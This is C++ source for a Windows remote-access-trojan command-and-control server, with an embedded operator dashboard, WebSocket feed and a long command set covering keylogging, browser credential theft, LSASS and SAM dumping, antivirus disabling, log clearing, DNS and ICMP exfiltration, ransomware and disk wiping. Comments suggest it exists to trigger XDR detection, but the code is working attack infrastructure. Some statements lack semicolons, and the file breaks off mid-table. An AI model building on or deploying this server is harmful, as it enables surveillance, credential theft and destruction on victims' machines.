// Unified C2 Server - Complete Single Executable Solution
// All-in-one: C2 Server + Web Server + WebSocket + Embedded Dashboard
// No external dependencies - everything in one EXE

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <queue>
#include <memory>
#include <atomic>
#include <algorithm>
#include <regex>
#include <random>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

// XOR encryption function removed - using UNENCRYPTED communication for XDR detection

// Debug logging configuration
enum DebugLevel {
    DEBUG_NONE = 0,
    DEBUG_ERROR = 1,
    DEBUG_WARNING = 2,
    DEBUG_INFO = 3,
    DEBUG_VERBOSE = 4
};

// Debug logging globals
DebugLevel g_debugLevel = DEBUG_VERBOSE;
std::ofstream g_debugLogFile;
std::mutex g_debugLogMutex;
bool g_debugLoggingEnabled = true;
const char* DEBUG_LOG_PATH = "c:\\rat\\logs\\server.log";

// Server Configuration
const int C2_PORT = 443;
const int WEB_PORT = 8080;
const int WEBSOCKET_PORT = 8081;
const char* VERSION = "1.0.0";

// Enhanced command types for comprehensive XDR triggering
enum CommandType {
    // Basic C2
    CMD_BEACON = 0x01,
    CMD_HEARTBEAT = 0x02,

    // Reconnaissance
    CMD_SYSINFO = 0x10,
    CMD_PROCESS_LIST = 0x11,
    CMD_NETWORK_CONFIG = 0x12,
    CMD_USER_ENUM = 0x13,
    CMD_DOMAIN_INFO = 0x14,
    CMD_SOFTWARE_ENUM = 0x15,

    // Collection
    CMD_SCREENSHOT = 0x20,
    CMD_KEYLOG_START = 0x21,
    CMD_KEYLOG_DUMP = 0x22,
    CMD_CLIPBOARD = 0x23,
    CMD_BROWSER_CREDS = 0x24,
    CMD_FILE_SEARCH = 0x25,
    CMD_WEBCAM_CAPTURE = 0x26,
    CMD_MICROPHONE_RECORD = 0x27,
    CMD_SCREEN_RECORD = 0x28,

    // Execution
    CMD_SHELL_EXEC = 0x30,
    CMD_POWERSHELL = 0x31,
    CMD_INJECT_PROCESS = 0x32,
    CMD_LOAD_MODULE = 0x33,
    CMD_MIGRATE_PROCESS = 0x34,
    CMD_REVERSE_SHELL = 0x35,
    CMD_REMOTE_DESKTOP = 0x36,

    // Persistence
    CMD_INSTALL_SERVICE = 0x40,
    CMD_REGISTRY_PERSIST = 0x41,
    CMD_SCHEDULED_TASK = 0x42,
    CMD_WMI_PERSIST = 0x43,
    CMD_STARTUP_FOLDER = 0x44,
    CMD_BOOTKIT_INSTALL = 0x45,

    // Lateral Movement
    CMD_PORT_SCAN = 0x50,
    CMD_SMB_SCAN = 0x51,
    CMD_PSEXEC = 0x52,
    CMD_WMI_EXEC = 0x53,
    CMD_RDP_EXEC = 0x54,
    CMD_PASS_THE_HASH = 0x55,
    CMD_MIMIKATZ_EXEC = 0x56,

    // Privilege Escalation
    CMD_UAC_BYPASS = 0x60,
    CMD_TOKEN_STEAL = 0x61,
    CMD_EXPLOIT_SUGGESTER = 0x62,
    CMD_LSASS_DUMP = 0x63,
    CMD_SAM_DUMP = 0x64,

    // Defense Evasion
    CMD_DISABLE_AV = 0x70,
    CMD_CLEAR_LOGS = 0x71,
    CMD_TIMESTOMP = 0x72,
    CMD_PROCESS_HOLLOW = 0x73,
    CMD_ROOTKIT_INSTALL = 0x74,
    CMD_AMSI_BYPASS = 0x75,
    CMD_ETW_DISABLE = 0x76,

    // Exfiltration
    CMD_STAGE_FILES = 0x80,
    CMD_COMPRESS_DATA = 0x81,
    CMD_EXFIL_HTTP = 0x82,
    CMD_EXFIL_DNS = 0x83,
    CMD_EXFIL_ICMP = 0x84,
    CMD_EXFIL_EMAIL = 0x85,
    CMD_CLOUD_UPLOAD = 0x86,

    // Impact
    CMD_RANSOMWARE = 0x90,
    CMD_WIPE_DISK = 0x91,
    CMD_CORRUPT_BOOT = 0x92,
    CMD_CRYPTO_MINER = 0x93,
    
    // Advanced Network Evasion
    CMD_TOR_CONNECT = 0xA0,
    CMD_TOR_API_CALL = 0xA1,
    CMD_REVERSE_SSH = 0xA2,
    CMD_NETCAT_TUNNEL = 0xA3,
    CMD_SOCAT_RELAY = 0xA4,
    CMD_CRYPTCAT_TUNNEL = 0xA5
};

// C2 Packet structure (must match client)
#pragma pack(push, 1)
struct C2Packet {
    uint32_t signature;      // 0xC2E5CA9E
    uint16_t version;        // Protocol version
    uint16_t flags;          // Encryption, compression flags
    uint32_t sessionId;      // Unique session ID
    uint16_t commandId;      // Command to execute
    uint16_t sequenceNum;    // Packet sequence
    uint32_t payloadSize;    // Size of payload
    uint32_t checksum;       // Packet checksum
};
#pragma pack(pop)

// Global state
std::atomic<bool> serverRunning(true);
std::mutex logMutex;
std::mutex clientsMutex;
std::mutex dataMutex;
std::atomic<int> commandSequence(0);

// Client information structure
struct ClientInfo {
    SOCKET socket;
    std::string id;
    std::string ipAddress;
    std::string hostname;
    std::string username;
    std::string osVersion;
    bool isElevated;
    bool isActive;
    std::chrono::system_clock::time_point firstSeen;
    std::chrono::system_clock::time_point lastSeen;
    int beaconCount;
    std::vector<std::string> executedCommands;
};

// Global client management
std::map<std::string, ClientInfo> connectedClients;
std::vector<std::string> activityLog;
std::map<std::string, int> statisticsData;

// Embedded Dashboard HTML (minified for size)
const char* EMBEDDED_DASHBOARD = R"(<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Unified C2 Dashboard</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#00ff88;font-family:'Courier New',monospace;overflow-x:hidden}
.header{background:linear-gradient(180deg,rgba(0,255,136,0.2) 0%,rgba(0,0,0,0) 100%);padding:20px;text-align:center;border-bottom:2px solid #00ff88}
h1{font-size:2.5em;text-shadow:0 0 20px #00ff88;margin-bottom:10px}.container{max-width:1400px;margin:20px auto;padding:0 20px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:30px}
.stat-card{background:rgba(0,255,136,0.1);border:1px solid #00ff88;padding:20px;border-radius:8px;text-align:center;transition:all .3s}
.stat-card:hover{background:rgba(0,255,136,0.2);box-shadow:0 0 15px rgba(0,255,136,0.3)}
.stat-value{font-size:2em;font-weight:bold;color:#ff0080;text-shadow:0 0 10px #ff0080}
.clients-section{background:rgba(0,255,136,0.05);border:1px solid #00ff88;border-radius:8px;padding:20px;margin-bottom:20px}
.client-card{background:rgba(0,0,0,0.5);border:1px solid #00ff88;padding:15px;border-radius:5px;margin:10px 0}
.btn{background:#00ff88;color:#000;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-weight:bold;margin:5px}
.btn:hover{background:#00ff44;box-shadow:0 0 10px #00ff88}
.log-section{background:#000;border:1px solid #00ff88;border-radius:8px;padding:20px;height:300px;overflow-y:auto}
.log-entry{padding:5px;border-bottom:1px solid rgba(0,255,136,0.2);font-size:0.9em}
.status-online{color:#00ff88}.status-offline{color:#ff0044}
</style></head><body>
<div class="header"><h1>Unified C2 Server Dashboard</h1><p>Real-time Command & Control Interface</p></div>
<div class="container">
<div class="stats-grid">
<div class="stat-card"><div class="stat-value" id="activeClients">0</div><div class="stat-label">Active Clients</div></div>
<div class="stat-card"><div class="stat-value" id="totalCommands">0</div><div class="stat-label">Commands Executed</div></div>
<div class="stat-card"><div class="stat-value" id="dataTransferred">0 MB</div><div class="stat-label">Data Transferred</div></div>
<div class="stat-card"><div class="stat-value" id="uptime">0h 0m</div><div class="stat-label">Server Uptime</div></div>
</div>
<div class="clients-section">
<h2>Connected Clients</h2>
<div id="clientsList"></div>
</div>
<div class="command-section">
<h2>Command Execution</h2>
<select id="targetClient"><option value="all">All Clients</option></select>
<select id="commandType">
<option value="cmd">Execute Command</option>
<option value="download">Download File</option>
<option value="upload">Upload File</option>
<option value="screenshot">Take Screenshot</option>
<option value="keylog">Start Keylogger</option>
</select>
<input type="text" id="commandInput" placeholder="Enter command..." style="width:300px;padding:10px;background:#000;color:#00ff88;border:1px solid #00ff88">
<button class="btn" onclick="executeCommand()">Execute</button>
</div>
<div class="log-section">
<h2>Activity Log</h2>
<div id="activityLog"></div>
</div>
</div>
<script>
let ws;
function connect(){
    ws = new WebSocket('ws://localhost:8081');
    ws.onopen = () => console.log('Connected to C2 Server');
    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        updateDashboard(data);
    };
    ws.onclose = () => setTimeout(connect, 1000);
}
function updateDashboard(data){
    document.getElementById('activeClients').textContent = data.activeClients || 0;
    document.getElementById('totalCommands').textContent = data.totalCommands || 0;
    document.getElementById('dataTransferred').textContent = (data.dataTransferred/1048576).toFixed(2) + ' MB';
    document.getElementById('uptime').textContent = formatUptime(data.uptime || 0);
    
    const clientsList = document.getElementById('clientsList');
    clientsList.innerHTML = '';
    if(data.clients){
        data.clients.forEach(client => {
            const div = document.createElement('div');
            div.className = 'client-card';
            div.innerHTML = `
                <strong>${client.hostname}</strong> (${client.ipAddress})<br>
                User: ${client.username} | OS: ${client.osVersion}<br>
                Status: <span class="${client.isActive ? 'status-online' : 'status-offline'}">${client.isActive ? 'Online' : 'Offline'}</span><br>
                Last Seen: ${new Date(client.lastSeen).toLocaleString()}
            `;
            clientsList.appendChild(div);
        });
    }
    
    const logDiv = document.getElementById('activityLog');
    if(data.logs){
        logDiv.innerHTML = data.logs.map(log => `<div class="log-entry">${log}</div>`).join('');
        logDiv.scrollTop = logDiv.scrollHeight;
    }
}
function formatUptime(seconds){
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${hours}h ${minutes}m`;
}
function executeCommand(){
    const target = document.getElementById('targetClient').value;
    const type = document.getElementById('commandType').value;
    const command = document.getElementById('commandInput').value;
    
    if(ws && ws.readyState === WebSocket.OPEN){
        ws.send(JSON.stringify({action: 'execute', target, type, command}));
        document.getElementById('commandInput').value = '';
    }
}
// Auto-refresh every 2 seconds
setInterval(() => {
    if(ws && ws.readyState === WebSocket.OPEN){
        ws.send(JSON.stringify({action: 'refresh'}));
    }
}, 2000);
connect();
</script></body></html>)";

// Initialize debug logging
bool initializeDebugLogging() {
    try {
        // Create directory if it doesn't exist
        CreateDirectoryA("c:\\rat", NULL);
        CreateDirectoryA("c:\\rat\\logs", NULL);
        
        // Open log file
        g_debugLogFile.open(DEBUG_LOG_PATH, std::ios::app);
        if (!g_debugLogFile.is_open()) {
            std::cerr << "Failed to open debug log file: " << DEBUG_LOG_PATH << std::endl;
            return false;
        }
        
        // Write startup message
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        g_debugLogFile << "\n\n========================================\n";
        g_debugLogFile << "C2 Server Starting - " << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "\n";
        g_debugLogFile << "Version: " << VERSION << "\n";
        g_debugLogFile << "Debug Level: " << g_debugLevel << "\n";
        g_debugLogFile << "========================================\n" << std::flush;
        
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Exception in initializeDebugLogging: " << e.what() << std::endl;
        return false;
    }
}

// Enhanced debug logging function
void debugLog(DebugLevel level, const std::string& category, const std::string& message, const std::string& details = "") {
    if (!g_debugLoggingEnabled || level > g_debugLevel) return;
    
    std::lock_guard<std::mutex> lock(g_debugLogMutex);
    
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
    
    // Level strings
    const char* levelStr = "UNKNOWN";
    switch (level) {
        case DEBUG_ERROR: levelStr = "ERROR"; break;
        case DEBUG_WARNING: levelStr = "WARN "; break;
        case DEBUG_INFO: levelStr = "INFO "; break;
        case DEBUG_VERBOSE: levelStr = "VERB "; break;
    }
    
    // Format log entry
    std::stringstream ss;
    ss << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    ss << "." << std::setfill('0') << std::setw(3) << ms.count() << "] ";
    ss << "[" << levelStr << "] ";
    ss << "[" << category << "] " << message;
    
    if (!details.empty()) {
        ss << " | Details: " << details;
    }
    
    std::string logEntry = ss.str();
    
    // Write to file
    if (g_debugLogFile.is_open()) {
        g_debugLogFile << logEntry << std::endl;
        g_debugLogFile.flush();
    }
    
    // Also output to console for ERROR and WARNING
    if (level <= DEBUG_WARNING) {
        std::cerr << logEntry << std::endl;
    }
}

// Original logging function enhanced with debug logging
void logActivity(const std::string& type, const std::string& message) {
    std::lock_guard<std::mutex> lock(logMutex);
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    
    std::stringstream ss;
    ss << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
       << "[" << type << "] " << message;
    
    std::string logEntry = ss.str();
    activityLog.push_back(logEntry);
    
    // Keep only last 100 entries
    if (activityLog.size() > 100) {
        activityLog.erase(activityLog.begin());
    }
    
    std::cout << logEntry << std::endl;
    
    // Also write to debug log
    debugLog(DEBUG_INFO, "ACTIVITY", message, "Type: " + type);
}

// Initialize Winsock
bool initializeWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return false;
    }
    return true;
}

// WebSocket frame handling
std::string createWebSocketFrame(const std::string& data) {
    std::string frame;
    frame.push_back(0x81); // FIN + text frame
    
    if (data.length() < 126) {
        frame.push_back(static_cast<char>(data.length()));
    } else if (data.length() < 65536) {
        frame.push_back(126);
        frame.push_back((data.length() >> 8) & 0xFF);
        frame.push_back(data.length() & 0xFF);
    }
    
    frame.append(data);
    return frame;
}

// Parse WebSocket frame
std::string parseWebSocketFrame(const std::string& frame) {
    if (frame.length() < 2) return "";
    
    size_t payloadStart = 2;
    size_t payloadLength = frame[1] & 0x7F;
    
    if (payloadLength == 126) {
        if (frame.length() < 4) return "";
        payloadLength = (static_cast<unsigned char>(frame[2]) << 8) | 
                       static_cast<unsigned char>(frame[3]);
        payloadStart = 4;
    }
    
    bool masked = (frame[1] & 0x80) != 0;
    if (masked) {
        payloadStart += 4;
    }
    
    if (frame.length() < payloadStart + payloadLength) return "";
    
    std::string payload = frame.substr(payloadStart, payloadLength);
    
    if (masked && payloadStart >= 4) {
        const char* mask = &frame[payloadStart - 4];
        for (size_t i = 0; i < payload.length(); i++) {
            payload[i] ^= mask[i % 4];
        }
    }
    
    return payload;
}

// Get current statistics as JSON
std::string getStatisticsJSON() {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    // Calculate uptime
    static auto startTime = std::chrono::system_clock::now();
    auto uptime = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now() - startTime).count();
    
    std::stringstream json;
    json << "{";
    json << "\"activeClients\":" << connectedClients.size() << ",";
    json << "\"totalCommands\":" << statisticsData["totalCommands"] << ",";
    json << "\"dataTransferred\":" << statisticsData["dataTransferred"] << ",";
    json << "\"uptime\":" << uptime << ",";
    
    // Add clients array
    json << "\"clients\":[";
    bool first = true;
    for (const auto& [id, client] : connectedClients) {
        if (!first) json << ",";
        first = false;
        
        auto lastSeenTime = std::chrono::system_clock::to_time_t(client.lastSeen);
        json << "{";
        json << "\"id\":\"" << client.id << "\",";
        json << "\"hostname\":\"" << client.hostname << "\",";
        json << "\"ipAddress\":\"" << client.ipAddress << "\",";
        json << "\"username\":\"" << client.username << "\",";
        json << "\"osVersion\":\"" << client.osVersion << "\",";
        json << "\"isActive\":" << (client.isActive ? "true" : "false") << ",";
        json << "\"lastSeen\":\"" << std::put_time(std::localtime(&lastSeenTime), "%Y-%m-%d %H:%M:%S") << "\"";
        json << "}";
    }
    json << "],";
    
    // Add activity logs
    json << "\"logs\":[";
    first = true;
    for (const auto& log : activityLog) {
        if (!first) json << ",";
        first = false;
        json << "\"" << log << "\"";
    }
    json << "]";
    
    json << "}";
    return json.str();
}

// Handle WebSocket client
void handleWebSocketClient(SOCKET clientSocket) {
    char buffer[4096];
    
    // Receive WebSocket handshake
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0) {
        closesocket(clientSocket);
        return;
    }
    buffer[received] = '\0';
    
    // Parse WebSocket key
    std::string request(buffer);
    std::regex keyRegex("Sec-WebSocket-Key: (.+)\r\n");
    std::smatch match;
    
    if (std::regex_search(request, match, keyRegex)) {
        std::string websocketKey = match[1];
        std::string acceptKey = websocketKey + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        
        // Simple SHA1 and base64 (simplified for demo)
        // In production, use proper crypto libraries
        
        // Send WebSocket handshake response
        std::string response = "HTTP/1.1 101 Switching Protocols\r\n";
        response += "Upgrade: websocket\r\n";
        response += "Connection: Upgrade\r\n";
        response += "Sec-WebSocket-Accept: " + acceptKey + "\r\n\r\n";
        
        send(clientSocket, response.c_str(), response.length(), 0);
        
        // Handle WebSocket messages
        while (serverRunning) {
            received = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            std::string frame(buffer, received);
            std::string message = parseWebSocketFrame(frame);
            
            if (!message.empty()) {
                // Send statistics update
                std::string stats = getStatisticsJSON();
                std::string responseFrame = createWebSocketFrame(stats);
                send(clientSocket, responseFrame.c_str(), responseFrame.length(), 0);
            }
        }
    }
    
    closesocket(clientSocket);
}

// WebSocket server thread
void webSocketServerThread() {
    debugLog(DEBUG_INFO, "WEBSOCKET", "WebSocket server thread started");
    
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        int error = WSAGetLastError();
        logActivity("ERROR", "Failed to create WebSocket server socket");
        debugLog(DEBUG_ERROR, "WEBSOCKET", "Failed to create socket", "WSA Error: " + std::to_string(error));
        return;
    }
    debugLog(DEBUG_VERBOSE, "WEBSOCKET", "Socket created successfully")
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(WEBSOCKET_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logActivity("ERROR", "WebSocket server bind failed");
        closesocket(serverSocket);
        return;
    }
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "WebSocket server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("WEBSOCKET", "WebSocket server started on port " + std::to_string(WEBSOCKET_PORT));
    debugLog(DEBUG_INFO, "WEBSOCKET", "WebSocket server listening", "Port: " + std::to_string(WEBSOCKET_PORT));
    
    while (serverRunning) {
        debugLog(DEBUG_VERBOSE, "WEBSOCKET", "Waiting for WebSocket connection...")
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            char clientIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
            debugLog(DEBUG_INFO, "WEBSOCKET", "WebSocket connection accepted", "IP: " + std::string(clientIP));
            
            std::thread clientThread(handleWebSocketClient, clientSocket);
            clientThread.detach();
        } else {
            debugLog(DEBUG_WARNING, "WEBSOCKET", "Accept failed", "WSA Error: " + std::to_string(WSAGetLastError()));
        }
    }
    
    closesocket(serverSocket);
}

// Handle HTTP requests
void handleHTTPRequest(SOCKET clientSocket) {
    char buffer[4096];
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    
    if (received > 0) {
        buffer[received] = '\0';
        std::string request(buffer);
        
        // Parse HTTP request
        if (request.find("GET / ") == 0 || request.find("GET /index.html") == 0) {
            // Serve dashboard
            std::stringstream response;
            response << "HTTP/1.1 200 OK\r\n";
            response << "Content-Type: text/html\r\n";
            response << "Content-Length: " << strlen(EMBEDDED_DASHBOARD) << "\r\n";
            response << "Connection: close\r\n\r\n";
            response << EMBEDDED_DASHBOARD;
            
            send(clientSocket, response.str().c_str(), response.str().length(), 0);
        }
        else if (request.find("GET /api/stats") == 0) {
            // API endpoint for statistics
            std::string stats = getStatisticsJSON();
            
            std::stringstream response;
            response << "HTTP/1.1 200 OK\r\n";
            response << "Content-Type: application/json\r\n";
            response << "Content-Length: " << stats.length() << "\r\n";
            response << "Access-Control-Allow-Origin: *\r\n";
            response << "Connection: close\r\n\r\n";
            response << stats;
            
            send(clientSocket, response.str().c_str(), response.str().length(), 0);
        }
        else {
            // 404 Not Found
            std::string notFound = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            send(clientSocket, notFound.c_str(), notFound.length(), 0);
        }
    }
    
    closesocket(clientSocket);
}

// Web server thread
void webServerThread() {
    debugLog(DEBUG_INFO, "WEB_SERVER", "Web server thread started");
    
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        int error = WSAGetLastError();
        logActivity("ERROR", "Failed to create web server socket");
        debugLog(DEBUG_ERROR, "WEB_SERVER", "Failed to create socket", "WSA Error: " + std::to_string(error));
        return;
    }
    debugLog(DEBUG_VERBOSE, "WEB_SERVER", "Socket created successfully")
    
    // Allow socket reuse
    int opt = 1;
    setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(WEB_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logActivity("ERROR", "Web server bind failed");
        closesocket(serverSocket);
        return;
    }
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "Web server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("WEB", "Web server started on port " + std::to_string(WEB_PORT));
    std::cout << "\n[*] Dashboard accessible at: http://localhost:" << WEB_PORT << "\n" << std::endl;
    debugLog(DEBUG_INFO, "WEB_SERVER", "Web dashboard ready", "URL: http://localhost:" + std::to_string(WEB_PORT));
    
    while (serverRunning) {
        debugLog(DEBUG_VERBOSE, "WEB_SERVER", "Waiting for HTTP request...")
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            char clientIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
            debugLog(DEBUG_INFO, "WEB_SERVER", "HTTP request received", "IP: " + std::string(clientIP));
            
            std::thread clientThread(handleHTTPRequest, clientSocket);
            clientThread.detach();
        } else {
            debugLog(DEBUG_WARNING, "WEB_SERVER", "Accept failed", "WSA Error: " + std::to_string(WSAGetLastError()));
        }
    }
    
    closesocket(serverSocket);
}

// Get command name for logging
std::string getCommandName(CommandType cmd) {
    switch (cmd) {
    // Basic C2
    case CMD_BEACON: return "HEARTBEAT_BEACON";
    case CMD_HEARTBEAT: return "CONNECTION_HEARTBEAT";
    
    // Reconnaissance (Discovery)
    case CMD_SYSINFO: return "SYSTEM_INFO_COLLECTION";
    case CMD_PROCESS_LIST: return "PROCESS_ENUMERATION";
    case CMD_NETWORK_CONFIG: return "NETWORK_CONFIGURATION_DISCOVERY";
    case CMD_USER_ENUM: return "USER_ACCOUNT_ENUMERATION";
    case CMD_DOMAIN_INFO: return "DOMAIN_INFORMATION_GATHERING";
    case CMD_SOFTWARE_ENUM: return "SOFTWARE_DISCOVERY";
    
    // Collection
    case CMD_SCREENSHOT: return "SCREENSHOT_CAPTURE";
    case CMD_KEYLOG_START: return "KEYLOGGER_ACTIVATION";
    case CMD_KEYLOG_DUMP: return "KEYLOGGER_DATA_RETRIEVAL";
    case CMD_CLIPBOARD: return "CLIPBOARD_DATA_COLLECTION";
    case CMD_BROWSER_CREDS: return "BROWSER_CREDENTIAL_THEFT";
    case CMD_FILE_SEARCH: return "FILE_SYSTEM_SEARCH";
    case CMD_WEBCAM_CAPTURE: return "WEBCAM_SURVEILLANCE";
    case CMD_MICROPHONE_RECORD: return "AUDIO_RECORDING";
    case CMD_SCREEN_RECORD: return "SCREEN_RECORDING";
    
    // Execution
    case CMD_SHELL_EXEC: return "COMMAND_SHELL_EXECUTION";
    case CMD_POWERSHELL: return "POWERSHELL_SCRIPT_EXECUTION";
    case CMD_INJECT_PROCESS: return "MALICIOUS_PROCESS_INJECTION";
    case CMD_LOAD_MODULE: return "DYNAMIC_MODULE_LOADING";
    case CMD_MIGRATE_PROCESS: return "PROCESS_MIGRATION";
    case CMD_REVERSE_SHELL: return "REVERSE_SHELL_CONNECTION";
    case CMD_REMOTE_DESKTOP: return "REMOTE_DESKTOP_ACCESS";
    
    // Persistence
    case CMD_INSTALL_SERVICE: return "MALICIOUS_SERVICE_INSTALLATION";
    case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE_MECHANISM";
    case CMD_SCHEDULED_TASK: return "SCHEDULED_TASK_PERSISTENCE";
    case CMD_WMI_PERSIST: return "WMI_EVENT_PERSISTENCE";
    case CMD_STARTUP_FOLDER: return "STARTUP_FOLDER_PERSISTENCE";
    case CMD_BOOTKIT_INSTALL: return "BOOTKIT_INSTALLATION";
    
    // Lateral Movement
    case CMD_PORT_SCAN: return "NETWORK_PORT_SCANNING";
    case CMD_SMB_SCAN: return "SMB_SHARE_ENUMERATION";
    case CMD_PSEXEC: return "PSEXEC_LATERAL_MOVEMENT";
    case CMD_WMI_EXEC: return "WMI_REMOTE_EXECUTION";
    case CMD_RDP_EXEC: return "RDP_LATERAL_MOVEMENT";
    case CMD_PASS_THE_HASH: return "PASS_THE_HASH_ATTACK";
    case CMD_MIMIKATZ_EXEC: return "MIMIKATZ_CREDENTIAL_DUMP";
    
    // Privilege Escalation
    case CMD_UAC_BYPASS: return "UAC_BYPASS_EXPLOITATION";
    case CMD_TOKEN_STEAL: return "ACCESS_TOKEN_THEFT";
    case CMD_EXPLOIT_SUGGESTER: return "PRIVILEGE_ESCALATION_ENUMERATION";
    case CMD_LSASS_DUMP: return "LSASS_MEMORY_DUMP";
    case CMD_SAM_DUMP: return "SAM_DATABASE_EXTRACTION";
    
    // Defense Evasion
    case CMD_DISABLE_AV: return "ANTIVIRUS_DISABLING";
    case CMD_CLEAR_LOGS: return "EVENT_LOG_CLEARING";
    case CMD_TIMESTOMP: return "FILE_TIMESTAMP_MANIPULATION";
    case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING_INJECTION";
    case CMD_ROOTKIT_INSTALL: return "ROOTKIT_INSTALLATION";
    case CMD_AMSI_BYPASS: return "AMSI_BYPASS_TECHNIQUE";
    case CMD_ETW_DISABLE: return "ETW_LOGGING_DISABLING";
    
    // Exfiltration
    case CMD_STAGE_FILES: return "DATA_STAGING_FOR_EXFILTRATION";
    case CMD_COMPRESS_DATA: return "DATA_COMPRESSION";
    case CMD_EXFIL_HTTP: return "HTTP_DATA_EXFILTRATION";
    case CMD_EXFIL_DNS: return "DNS_TUNNEL_EXFILTRATION";
    case CMD_EXFIL_ICMP: return "ICMP_TUNNEL_EXFILTRATION";
    case CMD_EXFIL_EMAIL: return "EMAIL_DATA_EXFILTRATION";
    case CMD_CLOUD_UPLOAD: return "CLOUD_SERVICE_UPLOAD";
    
    // Impact
    case CMD_RANSOMWARE: return "RANSOMWARE_DEPLOYMENT";
    case CMD_WIPE_DISK: return "DISK_WIPING_ATTACK";
    case CMD_CORRUPT_BOOT: return "BOOT_SECTOR_CORRUPTION";
    case CMD_CRYPTO_MINER: return "CRYPTOCURRENCY_MINING";
    
    // Advanced Network Evasion
    case CMD_TOR_CONNECT: return "TOR_NETWORK_CONNECTION";
    case CMD_TOR_API_CALL: return "TOR_API_COMMUNICATION";
    case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
    case CMD_NETCAT_TUNNEL: return "NETCAT_NETWORK_TUNNEL";
    case CMD_SOCAT_RELAY: return "SOCAT_NETWORK_RELAY";
    case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_ENCRYPTED_TUNNEL";
    
    default: return "UNKNOWN_COMMAND";
    }
}

// Parse command string to CommandType
CommandType parseCommand(const std::string& cmdStr) {
    // Map string commands to enum values
    static std::map<std::string, CommandType> cmdMap = {
        {"BEACON", CMD_BEACON},
        {"HEARTBEAT", CMD_HEARTBEAT},
        {"SYSINFO", CMD_SYSINFO},
        {"PROCESS_LIST", CMD_PROCESS_LIST},
        {"NETWORK_CONFIG", CMD_NETWORK_CONFIG},
        {"USER_ENUM", CMD_USER_ENUM},
        {"DOMAIN_INFO", CMD_DOMAIN_INFO},
        {"SOFTWARE_ENUM", CMD_SOFTWARE_ENUM},
        {"SCREENSHOT", CMD_SCREENSHOT},
        {"KEYLOG_START", CMD_KEYLOG_START},
        {"KEYLOG_DUMP", CMD_KEYLOG_DUMP},
        {"CLIPBOARD", CMD_CLIPBOARD},
        {"BROWSER_CREDS", CMD_BROWSER_CREDS},
        {"FILE_SEARCH", CMD_FILE_SEARCH},
